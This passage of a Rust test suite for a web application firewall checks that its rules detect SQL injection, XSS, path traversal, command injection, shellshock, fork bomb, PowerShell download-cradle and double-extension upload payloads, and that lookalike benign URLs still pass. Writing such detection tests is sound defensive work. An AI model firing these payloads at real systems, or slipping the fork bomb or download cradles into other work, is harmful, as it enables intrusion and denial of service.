		// info-leak SQL the write-only `sqli_into_outfile` and `load_file` rules miss.
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("id=1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,version())),1)", "query").unwrap().rule_id, "sqli_privilege_functions");
		assert_eq!(waf.inspect_str("q=1;LOAD DATA INFILE '/etc/hostname' INTO TABLE t", "query").unwrap().category, WafCategory::Sqli);
		assert_eq!(waf.inspect_str("x=load data local infile 'f'", "query").unwrap().rule_id, "sqli_privilege_functions");
	}

	#[test]
	fn sqli_privilege_functions_keep_false_positives_low() {
		// Prose and reordered tokens that brush near the keywords without the attack syntax stay clean.
		let waf = Waf::starter();
		for uri in [
			"/docs/stored-procedure-guide",  // "procedure" word, no "procedure analyse"
			"/api/load-more-data",           // "load" + "data" as words, no INFILE
			"/blog/analyse-your-traffic",    // "analyse" alone
		] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn extended_xss_rules_match() {
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("<iframe src=//evil", "target").unwrap().rule_id, "xss_iframe_tag");
		assert_eq!(waf.inspect_str("href=data:text/html;base64,PHN2Zz4=", "target").unwrap().rule_id, "xss_data_html_uri");
	}

	#[test]
	fn html5_xss_vectors_match() {
		// The OWASP-CRS 941 HTML5 additions: newer auto-firing event handlers and the
		// injection-only `srcdoc` / `formaction` attributes all attribute to the Xss class.
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("x=<xss onanimationstart=alert(1)>", "query").unwrap().rule_id, "xss_html5_event_handler");
		assert_eq!(waf.inspect_str("x=<a onpointerover=alert(1)>", "query").unwrap().rule_id, "xss_html5_event_handler");
		assert_eq!(waf.inspect_str("x=<details ontoggle=alert(1)>", "query").unwrap().category, WafCategory::Xss);
		assert_eq!(waf.inspect_str("x=<z srcdoc=PHNjcmlwdD4>", "query").unwrap().rule_id, "xss_dangerous_attribute");
		assert_eq!(waf.inspect_str("x=<button formaction=javascript:alert(1)>", "query").unwrap().category, WafCategory::Xss);
	}

	#[test]
	fn html5_xss_rules_keep_false_positives_low() {
		// Params that merely start with `on`/contain `action` but are not event handlers or the
		// dangerous attributes stay clean.
		let waf = Waf::starter();
		for uri in ["/settings?onboarding=done", "/form?action=save", "/docs/pointer-events-css", "/page?transition=fade"] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn dangerous_html_tags_match() {
		// OWASP-CRS 941320 tag-handler port: plugin/resource loaders and legacy auto-fire tags beyond
		// the existing script/iframe/svg rules all attribute to the Xss class.
		let waf = Waf::starter();
		// Payloads kept free of `javascript:`/`on*=` handlers so first-match attributes them to the
		// tag rule rather than the (earlier) URI / event-handler rules — the tag itself is the signal.
		for (payload, why) in [
			("x=<object data=//evil/x.swf>", "object"),
			("x=<embed src=//evil/x.swf>", "embed"),
			("x=<applet code=Evil>", "applet"),
			("x=<base href=//evil/>", "base-href hijack"),
			("x=<bgsound src=//evil/x.wav>", "bgsound"),
			("x=<marquee behavior=scroll>", "marquee"),
			("x=<frameset cols=50%>", "frameset"),
		] {
			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} ({why}) should trip a dangerous-tag rule"));
			assert_eq!(m.rule_id, "xss_dangerous_tag", "{payload} ({why})");
			assert_eq!(m.category, WafCategory::Xss);
		}
	}

	#[test]
	fn dangerous_html_tags_keep_false_positives_low() {
		// Prose naming the tags as words, and the deliberately-excluded `<form>`/`<meta>` (left out to
		// avoid rich-text false positives), stay clean at this rule.
		let waf = Waf::starter();
		for uri in [
			"/docs/embed-a-video",       // "embed" as a word, no `<embed`
			"/blog/object-oriented",     // "object" prose
			"/shop/database-marquee",    // "marquee" as a word
		] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn file_inclusion_wrappers_match() {
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("page=php://filter/convert.base64-encode/resource=x", "target").unwrap().category, WafCategory::PathTraversal);
		assert_eq!(waf.inspect_str("file=/proc/self/environ", "target").unwrap().rule_id, "traversal_proc_self");
	}

	#[test]
	fn command_injection_rules_match() {
		let waf = Waf::starter();
		let m = waf.inspect_str("q=test;cat /etc/hosts", "target").unwrap();
		assert_eq!(m.category, WafCategory::CommandInjection);
		assert_eq!(m.rule_id, "cmdi_shell_command");
		assert_eq!(waf.inspect_str("cmd=/bin/sh -c whoami", "target").unwrap().rule_id, "cmdi_path_bin");
	}

	#[test]
	fn shellshock_signature_matches() {
		let waf = Waf::starter();
		let mut p = parts("GET", "/");
		p.headers.insert("user-agent", "() { :; }; echo vuln".parse().unwrap());
		assert_eq!(blocked(&waf.inspect(&p)).rule_id, "anomaly_shellshock");
	}

	#[test]
	fn fork_bomb_signature_matches() {
		// The classic `:(){ :|:& };:` fork bomb and its whitespace-spread variant both trip the
		// dedicated command-injection signature on the recursive `:|:&` self-pipe. `cmdi_fork_bomb`
		// sits earlier in the ruleset than `anomaly_shellshock`, so a full fork bomb (which also
		// carries `(){`) reports the fork-bomb id in first-match mode.
		let waf = Waf::starter();
		for payload in [":(){ :|:& };:", ":(){ : | : & };:"] {
			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} should trip the fork-bomb rule"));
			assert_eq!(m.rule_id, "cmdi_fork_bomb", "{payload}");
			assert_eq!(m.category, WafCategory::CommandInjection);
		}
		// The recursion is also visible to the collect-all path alongside shellshock's function
		// head, since a fork bomb is genuinely both anomalies. (Carried in a header to avoid the
		// `{}|` characters that `http::Uri` parsing rejects.)
		let mut p = parts("GET", "/");
		p.headers.insert("x-payload", ":(){ :|:& };:".parse().unwrap());
		let all = waf.inspect_all(&p);
		assert!(all.iter().any(|m| m.rule_id == "cmdi_fork_bomb"), "fork-bomb recursion should be reported");
		assert!(all.iter().any(|m| m.rule_id == "anomaly_shellshock"), "shellshock function head should also be reported");
	}

	#[test]
	fn fork_bomb_rule_keeps_false_positives_low() {
		// Benign strings carrying colons or pipes but not the colon-pipe-colon-ampersand recursion
		// stay clean: a time range, an alternation filter, a piped shell-doc URL.
		let waf = Waf::starter();
		for uri in ["/calendar?slot=09:00|10:00", "/logs?level=info|warn|error", "/docs/using-the-pipe-operator"] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn powershell_rce_rule_matches() {
		// OWASP-CRS 932120/932125: the download cradle, the encoded-command launcher, and the aliased
		// `iex(` call form — the PowerShell RCE vectors the cmd.exe rule misses.
		let waf = Waf::starter();
		for (payload, why) in [
			("(New-Object Net.WebClient).DownloadString('http://x/a.ps1')", "download cradle"),
			("powershell -nop -w hidden -enc SQBFAFgA", "encoded launcher"),
			("cmd=Invoke-Expression($env:x)", "invoke-expression"),
			("q=iex (iwr http://x/p)", "aliased iex call"),
			("d=[Convert]::FromBase64String('...')", "base64 decode"),
		] {
			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} ({why}) should trip the powershell rule"));
			assert_eq!(m.rule_id, "cmdi_powershell", "{payload} ({why})");
			assert_eq!(m.category, WafCategory::CommandInjection);
		}
	}

	#[test]
	fn powershell_rce_keeps_false_positives_low() {
		// Prose that merely names "invoke", "hidden", or "webclient" as words — without the PowerShell
		// cmdlet/flag idioms — stays clean.
		let waf = Waf::starter();
		for uri in [
			"/docs/how-to-invoke-a-callback",  // "invoke" prose, no `Invoke-<cmdlet>`
			"/blog/hidden-features",           // "hidden" word, no `-w hidden` flag
			"/api/webclient-usage",            // "webclient" word, no `Net.WebClient`
			"/search?q=encoded+video",         // "encoded" word, no `-EncodedCommand`
		] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn ifs_evasion_rule_matches() {
		// OWASP-CRS 932130/932200: the `$IFS` / `${IFS}` internal-field-separator substitution used to
		// build a space-free command line.
		let waf = Waf::starter();
		// Payloads kept free of other triggers (no `/etc/passwd`, no leading separator) so first-match
		// attributes them to the IFS rule specifically.
		for payload in ["cat${IFS}secret.txt", "ls${IFS}-la${IFS}/tmp", "echo$IFS$9done"] {
			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} should trip the IFS rule"));
			assert_eq!(m.rule_id, "cmdi_ifs_evasion", "{payload}");
			assert_eq!(m.category, WafCategory::CommandInjection);
		}
	}

	#[test]
	fn ifs_evasion_keeps_false_positives_low() {
		// A `$IFS`-adjacent identifier and a benign `${IF}`-style token stay clean — the rule needs the
		// exact `IFS` word.
		let waf = Waf::starter();
		assert!(waf.inspect_str("total=$IFSprofit", "query").is_none(), "$IFSprofit should not false-positive");
		for uri in ["/docs/if-statements", "/api/config?tpl=${IF}-then"] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn extended_rules_keep_false_positives_low() {
		// A handful of benign requests that brush near the new rules must still pass.
		let waf = Waf::starter();
		for uri in ["/blog/data-structures-101", "/shop/cats-and-dogs", "/docs/php-vs-python", "/files/binary-data"] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn crs_growth_rules_match_their_signatures() {
		// The signatures added in the OWASP-CRS coverage-growth pass each fire on a
		// representative payload.
		let waf = Waf::starter();
		// XSS via the SVG vector (SVG markup can carry script / event handlers). Uses a bare
		// tag so the SVG rule, not the event-handler rule, is the match.
		assert_eq!(waf.inspect_str("<svg width=1 height=1>", "target").unwrap().rule_id, "xss_svg_tag");
		// `$(...)` command substitution, which the separator-prefixed shell rule misses.
		assert_eq!(waf.inspect_str("q=$(whoami)", "target").unwrap().rule_id, "cmdi_command_substitution");
		// Windows command injection after a shell separator (the existing rule is Unix-centric).
		assert_eq!(waf.inspect_str("x=1&dir c:\\", "target").unwrap().rule_id, "cmdi_windows_command");
		// SSRF via a decimal-encoded IPv4 (127.0.0.1 as the integer 2130706433).
		assert_eq!(waf.inspect_str("url=http://2130706433/latest", "target").unwrap().category, WafCategory::Ssrf);
		// Boolean-based blind SQLi with `and` / a comparison operator (not just `or N=N`).
		assert_eq!(waf.inspect_str("id=5 AND 1=1", "target").unwrap().category, WafCategory::Sqli);
		assert_eq!(waf.inspect_str("id=5 OR 7<9", "target").unwrap().rule_id, "sqli_boolean_condition");
	}

	#[test]
	fn crs_growth_rules_keep_false_positives_low() {
		// Benign requests that brush near the new signatures must still pass.
		let waf = Waf::starter();
		for uri in [
			"/gallery/svgoptimizer",         // "svg" as a substring, not a tag
			"/pricing?plans=3",              // a bare number, no boolean operator
			"/directory/listing",           // "dir" as a path word, no separator
			"/go/http-status-codes",        // "http" without a decimal-IP host
			"/search?q=cats+and+dogs",      // "and" without a numeric comparison
		] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn double_extension_upload_rule_matches() {
		// The CVE-2026-33691 double-extension upload vector: a script extension trailing a
		// benign-looking one, including the whitespace-padded form, attributes to CodeInjection.
		let waf = Waf::starter();
		for (q, why) in [
			("file=avatar.jpg.php", "image cover, php payload"),
			("upload=report.pdf.jsp", "pdf cover, jsp payload"),
			("name=notes.txt.phtml", "text cover, phtml payload"),
			("f=doc.docx%20.php", "whitespace-padded double extension"),
			("f=page.html.cgi", "html cover, cgi payload"),
		] {
			let m = waf.inspect_str(q, "query").unwrap_or_else(|| panic!("{q} ({why}) should trip the double-extension rule"));
			assert_eq!(m.rule_id, "code_double_extension_upload", "{q} ({why})");
			assert_eq!(m.category, WafCategory::CodeInjection);
		}
	}

	#[test]
	fn double_extension_rule_keeps_false_positives_low() {
		// Ordinary two-part filenames whose trailing extension is not executable stay clean.
		let waf = Waf::starter();
		for uri in [
			"/dl/archive.tar.gz",
			"/img/photo.jpg.webp",
			"/data/export.csv.zip",
			"/assets/logo.min.svg",
		] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn crs_growth_batch_two_rules_match() {
		// The second CRS coverage batch: OOB/exec SQLi escalation, `{{7*7}}` template SSTI, and
		// the base64 Java-serialized-object marker.
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("q=';EXEC xp_cmdshell('dir')--", "target").unwrap().rule_id, "sqli_oob_exec");
		assert_eq!(waf.inspect_str("name={{7*7}}", "target").unwrap().rule_id, "code_ssti_template");
		assert_eq!(waf.inspect_str("data=rO0ABXNyABBqYXZh", "target").unwrap().rule_id, "code_java_serialized");
	}

	#[test]
	fn crs_growth_batch_two_keeps_false_positives_low() {
		let waf = Waf::starter();
		for uri in ["/files/upload", "/templates/starter-kit", "/docs/load-testing", "/blog/70-rules"] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn crs_appserver_sensitive_files_match() {
		// The CRS 4.26.0 restricted-files growth: container/app-server internal artifacts each
		// attribute to the PathTraversal class.
		let waf = Waf::starter();
		for (uri, why) in [
			("/.dockerenv", "docker container marker"),
			("/assets/.DS_Store", "macOS directory metadata"),
			("/WEB-INF/web.xml", "java servlet internals"),
			("/META-INF/MANIFEST.MF", "jar/war manifest"),
			("/.profile", "dot-segment shell startup file"),
		] {
			let v = waf.inspect(&parts("GET", uri));
			assert_eq!(blocked(&v).rule_id, "traversal_appserver_files", "{uri} ({why}) should trip the appserver-files rule");
		}
	}

	#[test]
	fn crs_appserver_sensitive_files_keep_false_positives_low() {
		// The prefix guards keep look-alike benign paths clean: a `profile` page (no dot
		// segment), a `.profiles` plural (word-boundary guard), and paths that merely mention
		// the framework directory names as ordinary words must still pass.
		let waf = Waf::starter();
		for uri in [
			"/settings/profile",      // profile page, no `/.profile` dot segment
			"/users/.profiles",       // plural, guarded by the trailing \b
			"/blog/web-infrastructure", // "web-inf" as a substring of a word, not `/web-inf/`
			"/docs/meta-information", // "meta-inf" as a substring, not the `/meta-inf/` dir
			"/store/checkout",        // "store" is not `.ds_store`
		] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn custom_filter_expr_rule_blocks_matching_shape() {
		// An operator authors a rule in the filter language that describes a request *shape*
		// the signature rules do not: POST to a login path. A matching request is blocked and
		// reports the custom id at location "custom"; a request of a different shape passes.
		let waf = Waf::starter().custom_rule("block_wp_login", WafCategory::ProtocolAnomaly, r#"method eq "POST" and path starts_with "/wp-login""#).unwrap();
		assert_eq!(waf.custom_rule_count(), 1);
		let v = waf.inspect(&parts("POST", "/wp-login.php"));
		let m = blocked(&v);
		assert_eq!(m.rule_id, "block_wp_login");
		assert_eq!(m.location, "custom");
		assert_eq!(m.category, WafCategory::ProtocolAnomaly);
		// A GET to the same path, and a POST elsewhere, do not match the shape.
		assert_eq!(waf.inspect(&parts("GET", "/wp-login.php")), Verdict::Allow);
		assert_eq!(waf.inspect(&parts("POST", "/api/items")), Verdict::Allow);
	}

	#[test]
	fn custom_rule_rejects_a_malformed_expression() {
		// A rule string that does not parse is rejected up front, not silently dropped.
		assert!(Waf::starter().custom_rule("bad", WafCategory::Sqli, r#"frob eq "x""#).is_err());
	}

	#[test]
	fn custom_expr_rule_from_the_field_builder() {
		// The programmatic counterpart: a rule built with the Field DSL rather than parsed.
		use crate::filter::Field;
		use axum::http::HeaderName;
		let waf = Waf::starter().custom_expr_rule("hdr_flag", WafCategory::ProtocolAnomaly, Field::header(HeaderName::from_static("x-attack")).contains("1"));
		let mut p = parts("GET", "/");
		p.headers.insert("x-attack", "value-1".parse().unwrap());
		assert_eq!(blocked(&waf.inspect(&p)).rule_id, "hdr_flag");
	}

	#[test]
	fn built_in_signature_takes_precedence_over_custom_in_first_match() {
		// A request that trips both a signature (XSS in the query) and a custom shape rule
		// reports the signature in first-match mode, since custom rules run after the fields.
		let waf = Waf::starter().custom_rule("catch_all_get", WafCategory::ProtocolAnomaly, r#"method eq "GET""#).unwrap();
		let mut p = parts("GET", "/search");
		p.headers.insert("user-agent", "<script>x</script>".parse().unwrap());
		let v = waf.inspect(&p);
		let m = blocked(&v);
		assert_eq!(m.category, WafCategory::Xss, "the signature block wins over the broad custom rule");
	}

	#[test]
	fn custom_rule_contributes_to_anomaly_scoring() {
		use crate::filter::Field;
		use axum::http::HeaderName;
		// In scoring mode a custom rule's category weight is summed with the signature hits: a
		// lone SQLi header (5) is under a threshold of 8, but adding a custom ProtocolAnomaly
		// rule (3) on the same request reaches it.
		let attack = || {
			let mut p = parts("GET", "/");
			p.headers.insert("user-agent", "1 UNION SELECT pw".parse().unwrap());
			p
		};
		let base = Waf::starter().scoring_threshold(8);
		assert_eq!(base.inspect(&attack()), Verdict::Allow, "SQLi alone (5) is below the threshold of 8");
		let with_custom = Waf::starter().scoring_threshold(8).custom_expr_rule("ua_present", WafCategory::ProtocolAnomaly, Field::header(HeaderName::from_static("user-agent")).contains("UNION"));
		let v = with_custom.inspect(&attack());
		assert_eq!(blocked(&v).score, Some(8), "SQLi (5) + custom anomaly (3) reaches the threshold");
	}

	#[test]
	fn single_encoded_xss_is_decoded_and_blocked() {
		// `<script>` hidden as %3Cscript%3E is caught after one decode pass.
		let waf = Waf::starter();
		let m = waf.inspect_str("%3Cscript%3Ealert(1)%3C/script%3E", "target").unwrap();
		assert_eq!(m.rule_id, "xss_script_tag");
	}

	#[test]
	fn single_encoded_traversal_is_decoded_and_blocked() {
		// `..%2f` decodes to `../`, matching the plaintext traversal rule.
		let waf = Waf::starter();
		let v = waf.inspect(&parts("GET", "/files/..%2f..%2fetc/passwd"));
		assert_eq!(blocked(&v).category, WafCategory::PathTraversal);
	}

	#[test]
	fn double_encoded_input_is_blocked_as_anomaly() {
		// `%252e%252e%252f` -> `%2e%2e%2f` -> `../`: two passes, the evasion guard fires.
		let waf = Waf::starter();
		let m = waf.inspect_str("a%252e%252e%252fb", "target").unwrap();
		assert_eq!(m.rule_id, MULTI_ENCODING_RULE_ID);
		assert_eq!(m.category, WafCategory::ProtocolAnomaly);
	}

	#[test]
	fn multi_encoding_guard_can_be_relaxed_and_still_catches_payload() {
		// With the anomaly guard off, the fully-decoded payload still matches its rule.
		// `' OR 1=1` double-encoded: %2527%2520OR%25201%253D1 -> %27%20OR%201%3D1 -> ' OR 1=1
		let waf = Waf::starter().block_multi_encoded(false);
		let m = waf.inspect_str("%2527%2520OR%25201%253D1", "target").unwrap();
		assert_eq!(m.category, WafCategory::Sqli);
	}

	#[test]
	fn benign_encoded_input_still_passes() {
		// A legitimately percent-encoded space in a title is decoded but matches nothing.
		let waf = Waf::starter();
		assert_eq!(waf.inspect(&parts("GET", "/search?q=hello%20world")), Verdict::Allow);
	}

	#[test]
	fn strip_sql_comments_collapse_ws_transforms() {
		// Ordinary block comments become a separator space; MySQL executable comments keep their
		// payload; whitespace runs collapse; a plain string is unchanged.
		assert_eq!(strip_sql_comments_collapse_ws("UNION/**/SELECT"), "UNION SELECT");
		assert_eq!(strip_sql_comments_collapse_ws("id=1/*x*/AND/*y*/1=1"), "id=1 AND 1=1");
		assert_eq!(strip_sql_comments_collapse_ws("/*!50000UNION*/SELECT"), "UNION SELECT");
		assert_eq!(strip_sql_comments_collapse_ws("AND    1=1"), "AND 1=1");
		assert_eq!(strip_sql_comments_collapse_ws("un/**/ion"), "un ion"); // keyword split stays broken
		assert_eq!(strip_sql_comments_collapse_ws("plain value"), "plain value");
	}

	#[test]
	fn comment_padded_sqli_is_caught_after_normalization() {
		// The whitespace/comment-padding evasion (CVE-2026-33691 / CRS 933111): `/**/` and excess
		// whitespace split the `union … select` keyword pair so it evades the raw form, but the
		// comment-stripped / whitespace-collapsed pass folds it back and the SQLi rule fires.
		let waf = Waf::starter();
		for payload in ["1 UNION/**/SELECT password", "1 UNION/*!50000*/SELECT password", "1 union   select null"] {
			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} should be caught after normalization"));
			assert_eq!(m.category, WafCategory::Sqli, "{payload}");
		}
	}

	#[test]
	fn comment_normalization_keeps_false_positives_low() {
		// A benign request that merely contains a `/* */` comment or double spaces but no attack
		// keyword stays clean after normalization.
		let waf = Waf::starter();
		for uri in ["/snippets?css=.a%20/*%20note%20*/%20.b", "/docs/c-comment-syntax", "/search?q=hello%20%20world"] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn malformed_percent_is_left_verbatim() {
		// A stray `%` and a truncated `%2` are not decodable; nothing should fire.
		let (decoded, changed) = percent_decode_once("100%25 done %2");
		assert!(changed); // the %25 -> %
		assert_eq!(decoded, "100% done %2");
		let (decoded2, changed2) = percent_decode_once("bare % and %zz");
		assert!(!changed2);
		assert_eq!(decoded2, "bare % and %zz");
	}

	#[test]
	fn body_inspection_is_off_by_default() {
		let waf = Waf::starter();
		assert_eq!(waf.body_cap(), None);
	}

	#[test]
	fn inspect_body_blocks_signature_payload() {
		let waf = Waf::starter().inspect_body_up_to(4096);
		assert_eq!(waf.body_cap(), Some(4096));
		let v = waf.inspect_body(b"comment=<script>steal()</script>");
		assert_eq!(blocked(&v).category, WafCategory::Xss);
		assert_eq!(blocked(&v).location, "body");
	}

	#[test]
	fn inspect_body_decodes_encoded_payload() {
		// A form-encoded SQLi body trips the rule after normalization, like any field.
		let waf = Waf::starter().inspect_body_up_to(4096);
		let v = waf.inspect_body(b"q=1%20UNION%20SELECT%20pw%20FROM%20users");
		assert_eq!(blocked(&v).category, WafCategory::Sqli);
	}

	#[test]
	fn inspect_body_allows_benign_payload() {
		let waf = Waf::starter().inspect_body_up_to(4096);
		assert_eq!(waf.inspect_body(b"name=Ada&message=hello there"), Verdict::Allow);
	}

	#[test]
	fn inspect_body_handles_binary_bytes() {
		// Non-UTF-8 bytes must not panic; the lossy decode still scans embedded ASCII.
		let waf = Waf::starter().inspect_body_up_to(4096);
		let mut body = vec![0xff, 0xfe, 0x00];
		body.extend_from_slice(b"<script>");
		assert_eq!(waf.inspect_body(&body), Verdict::Block(WafMatch { rule_id: "xss_script_tag", category: WafCategory::Xss, location: "body".to_owned(), score: None }));
	}

	#[test]
	fn normalize_counts_decode_passes() {
		assert_eq!(normalize("plain/path", false).decode_passes, 0);
		assert_eq!(normalize("%2e%2e", false).decode_passes, 1);
		assert_eq!(normalize("%252e", false).decode_passes, 2);
		// Decoding stops at the cap even if more layers remain.
		assert!(normalize("%25252525252e", false).decode_passes <= MAX_DECODE_PASSES);
	}

	#[test]
	fn plus_folds_to_space_only_when_requested() {
		// '+' is a literal in a path/header, a space in a query/form field.
		let n_path = normalize("a+b", false);
		assert_eq!(n_path.decoded, "a+b");
		assert_eq!(n_path.decode_passes, 0);
		let n_query = normalize("a+b", true);
		assert_eq!(n_query.decoded, "a b");
	}

	#[test]
	fn plus_encoded_sqli_in_query_is_caught() {
		// `a+OR+1=1` evades the whitespace-requiring tautology rule on the raw string but
		// trips it once '+' folds to a space in the query field.
		let waf = Waf::starter();
		let v = waf.inspect(&parts("GET", "/login?user=a+OR+1=1"));
		let m = blocked(&v);
		assert_eq!(m.category, WafCategory::Sqli);
		assert_eq!(m.location, "query");
	}

	#[test]
	fn plus_in_path_is_not_treated_as_space() {
		// A literal '+' in a path segment must not be folded — no false "query" decoding.
		let waf = Waf::starter();
		assert_eq!(waf.inspect(&parts("GET", "/c++/reference")), Verdict::Allow);
	}

	#[test]
	fn scoring_mode_allows_single_weak_hit_below_threshold() {
		// One protocol-anomaly hit (weight 3) under a threshold of 8 is tolerated, where
		// first-match mode would have blocked it.
		let waf = Waf::starter().scoring_threshold(8);
		let mut p = parts("GET", "/");
		p.headers.insert("user-agent", "() { :; }; echo".parse().unwrap());
		assert_eq!(waf.inspect(&p), Verdict::Allow);
		// First-match mode (no threshold) still blocks the same request.
		assert!(matches!(Waf::starter().inspect(&p), Verdict::Block(_)));
	}

	#[test]
	fn scoring_mode_blocks_when_signals_combine() {
		// SQLi (5) in the query + XSS (4) in a header = 9 >= threshold 8 → blocked, and the
		// reported rule is the highest-weight (SQLi) signature.
		let waf = Waf::starter().scoring_threshold(8);
		let mut p = parts("GET", "/items?q=1%20OR%201=1");
		p.headers.insert("user-agent", "<script>x</script>".parse().unwrap());
		let v = waf.inspect(&p);
		assert_eq!(blocked(&v).category, WafCategory::Sqli);
	}

	#[test]
	fn scoring_block_carries_aggregate_score() {
		// SQLi (5) in the query + XSS (4) in a header = 9. The block's representative match
		// reports that aggregate so a scored block is observable as such.
		let waf = Waf::starter().scoring_threshold(8);
		let mut p = parts("GET", "/items?q=1%20OR%201=1");
		p.headers.insert("user-agent", "<script>x</script>".parse().unwrap());
		let v = waf.inspect(&p);
		assert_eq!(blocked(&v).score, Some(9));
	}

	#[test]
	fn first_match_block_has_no_score() {
		// First-match mode (no threshold) never attaches an aggregate score.
		let waf = Waf::starter();
		let v = waf.inspect(&parts("GET", "/items?q=1%20UNION%20SELECT%20pw"));
		assert_eq!(blocked(&v).score, None);
	}

	#[test]
	fn scoring_mode_multi_encoding_hard_block_has_no_score() {
		// The multiple-encoding guard is an independent hard block, not a score-driven one,
		// so it carries no aggregate score even in scoring mode.
		let waf = Waf::starter().scoring_threshold(1000);
		let v = waf.inspect(&parts("GET", "/x?p=a%252e%252e%252fb"));
		assert_eq!(blocked(&v).rule_id, MULTI_ENCODING_RULE_ID);
		assert_eq!(blocked(&v).score, None);
	}

	#[test]
	fn scoring_mode_blocks_single_hit_at_threshold() {
		// A lone SQLi (weight 5) meets a threshold of 5.
		let waf = Waf::starter().scoring_threshold(5);
		assert!(matches!(waf.inspect(&parts("GET", "/items?q=1%20UNION%20SELECT%20pw")), Verdict::Block(_)));
	}

	#[test]
	fn scoring_mode_still_hard_blocks_multi_encoding() {
		// The multiple-encoding guard fires regardless of how high the threshold is.
		let waf = Waf::starter().scoring_threshold(1000);
		let v = waf.inspect(&parts("GET", "/x?p=a%252e%252e%252fb"));
		assert_eq!(blocked(&v).rule_id, MULTI_ENCODING_RULE_ID);
	}

	#[test]
	fn scoring_mode_allows_clean_request() {
		let waf = Waf::starter().scoring_threshold(5);
		assert_eq!(waf.inspect(&parts("GET", "/articles/hello-world?page=2")), Verdict::Allow);
	}

	#[test]
	fn inspect_all_collects_every_signature() {
		let waf = Waf::starter();
		// SQLi in the query plus an XSS header — first-match `inspect` returns only one,
		// `inspect_all` returns both.
		let mut p = parts("GET", "/items?q=1%20UNION%20SELECT%20pw%20FROM%20users");
		p.headers.insert("referer", "<script>x</script>".parse().unwrap());
		let all = waf.inspect_all(&p);
		assert!(all.iter().any(|m| m.category == WafCategory::Sqli && m.location == "query"));
		assert!(all.iter().any(|m| m.rule_id == "xss_script_tag" && m.location == "header:referer"));
	}

	#[test]
	fn inspect_all_is_empty_for_benign_request() {
		let waf = Waf::starter();
		assert!(waf.inspect_all(&parts("GET", "/articles/hello-world?page=2")).is_empty());
		assert_eq!(anomaly_score(&[]), 0);
	}

	#[test]
	fn inspect_all_dedups_raw_and_decoded_in_one_field() {
		// `<script>` appears literally; its raw form already trips xss_script_tag and the
		// field's decoded form is identical here — the rule is reported once per field.
		let waf = Waf::starter();
		let all = waf.inspect_all(&parts("GET", "/x?c=%3Cscript%3E%3Cscript%3E"));
		let n = all.iter().filter(|m| m.rule_id == "xss_script_tag" && m.location == "query").count();
		assert_eq!(n, 1, "a rule fires at most once per field");
	}

	#[test]
	fn anomaly_score_sums_category_weights() {
		// SQLi (5) + XSS (4) = 9; threshold tuning is the operator's, not the engine's.
		let waf = Waf::starter();
		let mut p = parts("GET", "/items?q=1%20OR%201=1");
		p.headers.insert("user-agent", "<script>x</script>".parse().unwrap());
		let score = anomaly_score(&waf.inspect_all(&p));
		assert!(score >= 9, "expected combined SQLi+XSS score >= 9, got {score}");
	}

	#[test]
	fn inspect_all_respects_disabled_rules() {
		// A disabled rule contributes neither a match nor score on the collect-all path.
		let waf = Waf::starter().disable_category(WafCategory::Sqli);
		let all = waf.inspect_all(&parts("GET", "/items?q=1%20UNION%20SELECT%20pw"));
		assert!(all.iter().all(|m| m.category != WafCategory::Sqli));
	}

	#[test]
	fn category_weight_defaults_match_enum() {
		// A fresh WAF assigns every category its enum-default weight.
		let waf = Waf::starter();
		for cat in WafCategory::ALL {
			assert_eq!(waf.category_weight(cat), cat.weight());
		}
	}

	#[test]
	fn set_category_weight_overrides_instance_score() {
		// Lower the protocol-anomaly weight; the instance score reflects it while the free
		// `anomaly_score` (defaults) does not.
		let waf = Waf::starter().set_category_weight(WafCategory::ProtocolAnomaly, 1);
		assert_eq!(waf.category_weight(WafCategory::ProtocolAnomaly), 1);
		let matches = vec![WafMatch { rule_id: "x", category: WafCategory::ProtocolAnomaly, location: "header:user-agent".to_owned(), score: None }];
		assert_eq!(waf.score(&matches), 1);
		assert_eq!(anomaly_score(&matches), WafCategory::ProtocolAnomaly.weight());
	}

	#[test]
	fn tuned_weight_changes_scoring_block_decision() {
		// A lone shellshock hit (default weight 3) blocks at threshold 3; raising the same
		// category's weight requirement by tuning it down to 1 lets it pass under that
		// threshold — the operator's severity knob, no threshold change.
		let mut p = parts("GET", "/");
		p.headers.insert("user-agent", "() { :; }; echo".parse().unwrap());
		assert!(matches!(Waf::starter().scoring_threshold(3).inspect(&p), Verdict::Block(_)));
		let tuned = Waf::starter().scoring_threshold(3).set_category_weight(WafCategory::ProtocolAnomaly, 1);
		assert_eq!(tuned.inspect(&p), Verdict::Allow);
	}

	#[test]
	fn tuned_weight_carries_into_scored_block_score() {
